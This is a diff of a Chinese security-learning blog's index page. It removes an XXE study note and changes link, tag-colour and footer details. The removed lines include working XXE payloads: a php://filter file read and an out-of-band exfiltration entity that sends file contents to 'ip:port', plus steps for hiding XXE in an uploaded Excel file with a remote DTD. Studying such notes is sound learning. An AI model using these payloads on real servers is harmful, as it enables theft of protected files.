@@ -166,10 +166,19 @@
         
 
 <div class="post">
-    <a href="/uncategorized/XXE/">
+    <a href="/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/XXE/">
         <h2 class="post-title">XXE</h2>
     </a>
     <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                网络空间安全学习
+            </a>
+        </span>
         
         <span class="date">
             <span class="icon">
@@ -183,120 +192,7 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <h2 id="XXE-XML-External-Entity-：XML外部实体注入攻击"><a href="#XXE-XML-External-Entity-：XML外部实体注入攻击" class="headerlink" title="XXE(XML External Entity)：XML外部实体注入攻击"></a>XXE(XML External Entity)：XML外部实体注入攻击</h2><p>​	发生在应用程序解析xml输入时没有禁止外部实体加载，导致攻击者可以通过xml的外部实体获取服务器中本应该被保护的数据</p>
-<h3 id="XML及DTE"><a href="#XML及DTE" class="headerlink" title="XML及DTE"></a>XML及DTE</h3><h4 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h4><p>是一种灵活的语言，所有标签都可以自定义，设计宗旨是传输数据</p>
-<p>XML文档结构包含：xml声明，dtd文档类型定义(*)，文档元素</p>
-<pre><code class="xml"> &lt;?xml version=&quot;1.0&quot; encode=&quot;utf=8&quot;?&gt;   #XML文档声明
- &lt;book id=&quot;1&quot;&gt;                   #自定义根元素book,属性id为1
-  &lt;name&gt;XML&lt;/name&gt;           #自定义四个子元素，即book的属性
-  &lt;author&gt;xml&lt;/author&gt;
-  &lt;year&gt;2023&lt;/year&gt;
-  &lt;price&gt;19.9&lt;/price&gt;
- &lt;/book&gt;         #根元素闭合
-</code></pre>
-<ol>
-<li>xml必须有一个根元素</li>
-<li>元素必须有一个关闭标签</li>
-<li>标签对大小写敏感</li>
-<li>元素必须被正确嵌套</li>
-<li>属性值必须加引号</li>
-</ol>
-<h4 id="DTD基础"><a href="#DTD基础" class="headerlink" title="DTD基础"></a>DTD基础</h4><p>为xml定义语义约束</p>
-<p>可以把DTD理解为一个模板，模板中定义了用户自己创建的根元素及其相应的子元素，如</p>
-<pre><code class="xml"> &lt;!DOCTYPE book [
-     &lt;!ELEMENT book (name, author, year)&gt;
-     &lt;!ELEMENT name (#PCDATA)&gt;
-     &lt;!ELEMENT author (#PCDATA)&gt;
-     &lt;!ELEMENT year (#PCDATA)
- ]&gt;  #内部
- &lt;!DOCTYPE book SYSTEM &quot;file&quot;&gt;  #外部
-</code></pre>
-<p><strong>CDATA</strong> 指的是不应该由XML解析器进行解析的文本数据，CDATA部分所有内容都会被解析器忽略，例如&lt;(新元素开始)和&amp;(字符实体开始)在xml中是非法的</p>
-<p>语法：由<code>&lt;![CDATA[开始, ]]&gt; 结束</code></p>
-<ul>
-<li>CDATA部分不能包括字符串”]]&gt;”也不允许嵌套</li>
-<li>标记结尾的”]]&gt;”不能包含空格或换行</li>
-</ul>
-<h5 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h5><ol>
-<li><p>内部普通实体</p>
-<p> 声明: <code>&lt;!ENTITY 实体名 &quot;值&quot;&gt;</code></p>
-<p> 引用: <code>&amp;实体名;</code></p>
-</li>
-<li><p>外部普通实体</p>
-<p> 声明: <code>&lt;!ENTITY 实体名 SYSTEM &quot;URI/URL&quot;&gt;</code>  </p>
-<p> 利用：</p>
-<pre><code class="xml"> &lt;?xml version=&quot;1.0&quot; encode=&quot;utf=8&quot;?&gt; 
- &lt;!DOCTYPE ANY [
-     &lt;!ENTITY xxe SYSTEM “php://filter/read=convert.base64-encode/resource=xxx&quot;&gt;
- ]&gt;
- &lt;root&gt;&amp;xxe;&lt;/root&gt;
-</code></pre>
-<p> <img src="https://www.imageoss.com/images/2023/04/14/image-20230411161616717f971b4ce7be08520.png" alt="image-20230411161616717"></p>
-</li>
-</ol>
-<blockquote>
-<p>不允许内部实体和外部实体一起使用</p>
-</blockquote>
-<ol>
-<li><p>参数实体</p>
-<p> 声明：</p>
-<pre><code> * 内部：`&lt;!ENTITY % 实体名 &quot;值&quot;&gt;`
- * 外部：`&lt;!ENTITY % 实体名 SYSTEM &quot;URI&quot;&gt;`
-</code></pre>
-<p> 只能在DTD中引用：<code>%实体名;</code> </p>
-<blockquote>
-<p>参数实体必须定义在单独的DTD文档中或XML文档的DTD区，前者为该XML文档的外部子集，后者为该XML文档的内部子集。但是引用只能在DTD文档中:即外部子集，而不能在XML文档的DTD区。</p>
-</blockquote>
-</li>
-</ol>
-<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><h4 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><ol>
-<li><p>寻找接受XML作为输入内容的端点</p>
-<blockquote>
-<p>通过修改http请求包中Content-Type字段等方法，查看响应</p>
-</blockquote>
-</li>
-<li><p>如果解析xml就可以尝试引用实体和DTD</p>
-</li>
-<li><p>如果可以引用外部实体，则存在XXE</p>
-</li>
-</ol>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
-<li><p>本地文件读取</p>
-<ul>
-<li>file:.&#x2F;&#x2F;</li>
-<li>php:&#x2F;&#x2F;filter</li>
-</ul>
-<p> 若XXE无回显，则可以：</p>
-<p> 首先在自己服务器加入DTD文件，然后直接调用外部实体，通过本地端口监听</p>
-<pre><code class="xml"> &lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:port/?p=%file;&#39;&gt;&quot;&gt;
-</code></pre>
-<p> 来在本地读取</p>
-</li>
-<li><p>内网主机探测</p>
-<p> 爆破c段，无回显查看时长</p>
-</li>
-</ol>
-<h4 id="Java中上传excel"><a href="#Java中上传excel" class="headerlink" title="Java中上传excel"></a>Java中上传excel</h4><p>更改excel后缀为zip，打开后更改xml，在开始添加xxe代码</p>
-<p><img src="https://www.imageoss.com/images/2023/04/14/image-202304112305112966af8e4d622fbab09.png" alt="image-20230411230511296"></p>
-<p><a target="_blank" rel="noopener" href="https://ngrok.cc/">免费的隧道</a> 注册后安装tomcat并配置端口与隧道一致，将dtd文件放在webapps&#x2F;ROOT目录下，调用后在logs文件夹中查看</p>
-<p>eg.dtd:</p>
-<pre><code class="xml"> &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=target&quot;&gt;
- &lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;ip/?%file;&#39;&gt;&quot;&gt;
-</code></pre>
-<p>包中代码：</p>
-<pre><code class="xml"> &lt;?xml version=&quot;1.0&quot;?&gt;
- &lt;!DOCTYPE ANY[
- &lt;!ENTITY % dtd SYSTEM &quot;ip/eg.dtd&quot;&gt;
- %dtd;
- %int;
- %send;
- ]&gt;
-</code></pre>
-<p>之后查看日志</p>
-<h3 id="XXE修复"><a href="#XXE修复" class="headerlink" title="XXE修复"></a>XXE修复</h3><ol>
-<li>过滤用户输入</li>
-<li><img src="https://www.imageoss.com/images/2023/04/14/image-202304112321047160dff127ee0816614.png" alt="image-20230411232104716"></li>
-</ol>
+            <p>一篇XXE的学习笔记</p>
 
             
         </div>
@@ -310,13 +206,13 @@
         
         <span class="tag">
             
-            <a href="/tags/pt/" style="color: #03a9f4">
+            <a href="/tags/pt/" style="color: #00a596">
                 pt
             </a>
         </span>
         
     </div>
-    <a href="/uncategorized/XXE/" class="go-post">阅读全文</a>
+    <a href="/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/XXE/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
@@ -337,7 +233,7 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p>​	之前用的wordpress对markdown的支持太差了，找了好久没有合适的插件，于是转用hexo了，之前的博客不定时废弃:<a href="fc235.top">嘉然今天学什么</a> </p>
+            <p>​	之前用的wordpress对markdown的支持太差了，找了好久没有合适的插件，于是转用hexo了，之前的博客不定时废弃:<a target="_blank" rel="noopener" href="https://www.fc235.top/">嘉然今天学什么</a> </p>
 
             
         </div>
@@ -351,7 +247,7 @@
         
         <span class="tag">
             
-            <a href="/tags/misc/" style="color: #03a9f4">
+            <a href="/tags/misc/" style="color: #ff7d73">
                 misc
             </a>
         </span>
@@ -385,7 +281,7 @@
         </div>
         <div class="name">fc235</div>
         <div class="description">
-            <p>Description<br>…</p>
+            <p>一只菜鸡</p>
 
         </div>
         
@@ -409,7 +305,7 @@
     <div id="footer-wrap">
         <div>
             &copy;
-            2022 - 2023 嘉然今天学什么
+            2023 - 2023 嘉然今天学什么
             <span id="footer-icon">
                 <i class="fa-solid fa-font-awesome fa-fw"></i>
             </span>
